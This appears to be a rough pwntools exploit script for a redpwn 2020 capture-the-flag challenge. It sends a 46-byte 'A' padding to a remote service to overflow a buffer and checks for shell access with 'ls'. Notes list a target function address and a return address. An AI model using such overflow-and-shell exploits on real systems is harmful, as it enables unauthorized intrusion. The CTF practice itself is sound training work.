
from pwn import *
context.log_level='critical'
host,port="2020.redpwnc.tf",31199
for x in range(100):
    x=46
    s=remote(host,port)
    s.recvline()
    s.recvline()
    s.sendline("A"*x)
    try:
        s.sendline("ls")
        s.recvline()
        s.sendline("ls")
        s.recvline()
        print(x)
    except:
        print("false")


        0x4006e6  #adress of binFunction
        0x7fffff5d70b3 #return adrress of main

        4006e5